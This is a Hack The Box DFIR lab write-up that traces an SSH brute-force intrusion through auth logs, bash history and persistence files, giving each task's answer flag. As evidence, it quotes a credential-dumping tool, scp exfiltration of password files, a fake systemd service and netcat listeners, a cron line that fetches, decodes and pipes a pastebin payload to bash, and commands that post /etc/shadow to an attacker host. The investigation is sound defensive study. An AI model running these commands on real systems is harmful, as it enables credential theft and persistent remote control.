---
title: "HTB DFIR Sherlock: LuckyShot"
type: "posts"
author: WildPasta
author_url: "https://medium.com/@wildpasta"
published: 2026-02-21
source: Medium
toc: false
categories: ["writeups"]
tags: ["hackthebox", "dfir", "writeups"]
---

# HTB DFIR Sherlock: LuckyShot

Back with a new DFIR Sherlock on Hack The Box. Same collector, different scenario. Here we have to track down what happened on the compromised host after a successful SSH bruteforce attack. We will uncover some basic persistence and exfiltration technique going through this investigation.

---

> Task 1: What method did the attacker use to gain access to the system?

Looking at the `/var/log`folder, we don’t see specific service logs that stand out. However, when reviewing `/var/log/auth.log` it appears that the IP **192.168.161.198** successfully brute forced its way into the system as administrator.

{{< admonition type=success title="FLAG" open=false >}}
brute force
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}

> Task 2: At what time did the attacker successfully log in for the first time?

A successful SSH connection attempt would be shown in `/var/log/auth.log`as “Accepted password for <username> from <IP>”. The attack began at **19:38:18** so we can check any successful login attempts after that timestamp.

```
#source: /var/log/auth.log (l.869)
2025-02-10T19:39:03.232692+02:00 LuckyShot sshd[13105]: Accepted password for administrator from 192.168.161.198 port 46160 ssh2
```

So we can safely assume that the attacker got an initial foothold on the machine starting from there.

{{< admonition type=success title="FLAG" open=false >}}
2025–02–10 19:39:03
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}

> Task 3: Which user account was compromised by the attacker?

Following the track of the log entry identified in Task 2, it shows that the first user that logged-on during the bruteforce attack was **administrator**.


{{< admonition type=success title="FLAG" open=false >}}
administrator
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}

> Task 4: What command was executed by the attacker to check user privileges?

Since the **administrator’s account was compromised**, we inspect its `.bash_history`to look for command typed by the attacker. Aaand it appears that the intruder did not clear its track! The first few commands seem legit, so we will focus on those after the `exit`. The first command entered from this point onwards was: `groups administrator`. This is commonly used to **gather information** about a user, specifically about the groups they are member of.

{{< admonition type=success title="FLAG" open=false >}}
groups administrator
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}

> Task 5: What was the first tool the attacker downloaded to extract stored credentials from the system?

After basic recon, the attacker installed git and cloned a [repository](https://github.com/AlessandroZ/LaZagne) called: **LaZagne**.

```
#source: /home/administrator/.bash_history (l.43)
cd /tmp/
git clone https://github.com/AlessandroZ/LaZagne.git
[SNIP]
python3 laZagne.py all
```

It’s a useful (though noisy) credential-dumping software to have in a pentester toolkit. It allows password gathering from different sources on the host.

{{< admonition type=success title="FLAG" open=false >}}
LaZagne
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}

> Task 6: The attacker located sensitive files on the compromised system and transferred them to a remote machine. Which command-line tool was used for this exfiltration?

Evidence of exfiltration appears in the `.bash_history` on the line where “Passwords_Backup.txt” and “Server_Credentials.txt” were transferred over the attacker IP (which is using a kali linux, what a surprise 😮).

```
#source: /home/administrator/.bash_history (l.57)
scp Passwords_Backup.txt Server_Credentials.txt kali@192.168.161.198:~/Desktop/
```

{{< admonition type=success title="FLAG" open=false >}}
scp
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}

> Task 7: What IP did the attacker exfiltrate the files to?

The data is exfiltrated at the same address that performed the bruteforce attack. The IP address is the one mentioned in the code snippet above (Task 6) that used SCP for exfiltration.

{{< admonition type=success title="FLAG" open=false >}}
192.168.161.198
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}

> Task 8: The attacker continued their exploitation and executed a malicious script on the victim machine. What is the name of the script?

Getting through our `.bash_history` (again!) we see that a suspicious script was made executable and ran as sudo by administrator.

```
#source: /home/administrator/.bash_history (l.58)
cd /tmp/
chmod +x sys_monitor.sh
sudo ./sys_monitor.sh
```

{{< admonition type=success title="FLAG" open=false >}}
sys_monitor.sh
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}

> Task 9: What is the SHA1 hash of the malware?

The UAC collector retrieves file on the system but also issue commands to list running processes and get hashes of the files on the system. So we have to check the the folder _hash_executables/hash_executables.sha1_ and look for our _/home/administrator/tmp/sys_monitor.sh_ script to find its hash.

{{< admonition type=success title="FLAG" open=false >}}
3ae5dea716a4f7bfb18046bfba0553ea01021c75
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}

> Task 10: The malware installed a component that pretends to be part of system network management but is actually running with root privileges. What is the name of the component?

The quick win here is to search in all file for `sys_monitor.sh`and find out that malicious _/etc/systemd/system/systemd-networkm.service_ contains a service starting our script at **each startup**:

```
[Unit]
Description=System Network Management
After=network.target
```

```
[Service]
ExecStart=/bin/bash /tmp/sys_monitor.sh
Restart=always
User=root
```

```
[Install]
WantedBy=multi-user.target
```

The persistent component we’re looking for here is located in the system network management service.

{{< admonition type=success title="FLAG" open=false >}}
systemd-networkm.service
{{< /admonition >}}

Its a **common persistence** to create a new service that runs our payload. It allows to blend into the system as a service which may be overlooked compared to _crontab_ or _.bashrc_ persistence.

{{< style "height:2rem;" >}}{{< /style >}}

> Task 11: The attacker modified several startup configuration files, each spawning a network listener on a different port at login. What is the name of the file that starts the listener on the lowest port number?

First of all, we need to find the file used for persistence. As we known, the attacker got foothold at 2025–02–10 19:39:03 (_cf. Task 2_). So let’s check the last modified files from this point:

```
find . -type f -newermt "2025-02-10 19:39:03" -printf "%TY-%Tm-%Td %TH:%TM:%TS %p\n"| sort
```

{{< admonition type=tip title="Small tip" open=true >}}
The `-newermt` option evaluates the file content modification time (mtime), `-newerct` evaluates the metadata change time (ctime), and `-newerat` evaluates the last access time (atime).
{{< /admonition >}}

Some files in the _/root_ directory were modified around the same time and are clearly indicator of an attacker’s persistence:

- /root/.profile → added a netcat listener on port 9000
- /root/.bashrc → added a netcat listener on port 7575
- /root/.ssh/authorized_keys → added SSH key for kali@kali
- /root/.bash_history → got deleted


{{< image src="images/Backdoored_root_bashrc_2643.png" alt="Backdoored bashrc" caption="Backdoored /root/.bashrc" >}}

{{< admonition type=success title="FLAG" open=false >}}
.bashrc
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}

> Task 12: What is the username and hostname associated with the attacker?

As found previously in Task 11, a SSH key for the attacker’s host was added within `/root/.ssh/authorized_keys`. The public key was binded to the host: **kali@kali**.

{{< admonition type=success title="FLAG" open=false >}}
kali@kali
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}

> Task 13: The attacker created a user for persistence, what is the name of the created user?

The user created on Linux are append in the _/etc/passwd_ file. So if you look it up, you would find at the end a new Regev user!

You could also have spotted this in `/var/log/syslog` where there is multiple lines reading that Regev was added:

```
#source: /var/log/syslog (l. 6995)
2025-02-10T20:11:21.817150+02:00 LuckyShot bash[16911]: useradd: user 'Regev' already exists
```

{{< admonition type=success title="FLAG" open=false >}}
Regev
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}

> Task 14: At what exact timestamp was the new user created on the system?

In `/var/log/auth.log` you can see the command line ran to add _Regev_ user on the system.

```
#source: /var/log/auth.log (l. 1564)
2025-02-10T20:11:21.731285+02:00 LuckyShot sudo:     root : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash -G sudo,adm Regev
```

{{< admonition type=success title="FLAG" open=false >}}
2025-02-10 20:11:21
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}

> Task 15: The malware set up an automated process to fetch and execute a remote payload from a legitimate web service. What is the full command responsible for retrieving this payload?

Here the keyword _automated process_ should ring a bell and prompt us to look in the crontab area. To confirm this, you can see that a cron called `syscheck` was written on disk (and made executable shortly after).


{{< image src="images/Malicious_syscheck_cron_job_writing_9014.png" alt="Malicious syscheck cron job writing" caption="Malicious syscheck cron job writing (source: /var/log/auth.log)" >}}

The attacker used `/usr/bin/tee` to plant its malicious script. It is a linux binary that **reads stdin** and write both to **stdout** and in a **file** simultaneaously. Here, it looks like the attacker ran something like:

```
cat malicious_payload | ssh root@luckyshot "tee /etc/crond.d/syscheck"
```

In the written file, you can find a malicious command that runs every minute.

{{< admonition type=success title="FLAG" open=false >}}
command -v curl >/dev/null 2>&1 || (apt update && apt install -y curl) && curl -fsSL https://pastebin.com/raw/SAuEez0S | rev | base64 -d | bash
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}

> Task 16: The payload was used to extract more sensitive files. What was the command ran to extract the more sensitive file?

So analyzing the command we retrieved previously:

- attacker installs curl if not present on host
- curl the content of a pastebin (ignoring certificate signing)
- reverse its content
- base64 decode it and run it on host with bash interpreter

I could have handled this carefully using Cyberchef but YOLO, just run the command line without the bash piping at the end to echo the following.

```
#input: curl -fsSL https://pastebin.com/raw/SAuEez0S | rev | base64 -d
base64 /etc/shadow | curl -X POST -d @- http://192.168.161.198/steal.php
base64 /etc/passwd | curl -X POST -d @- http://192.168.161.198/steal.php
```

And from these two file that are extracted, the **shadow** one is the most sensitive since it can be used to crack user password offline.

{{< admonition type=success title="FLAG" open=false >}}
base64 /etc/shadow | curl -X POST -d @- http://192.168.161.198/steal.php
{{< /admonition >}}

---

{{< image src="images/LuckyShot_success_banner_6559.png" alt="LuckyShot success banner" caption="Successful LuckyShot exploitation on the target" >}}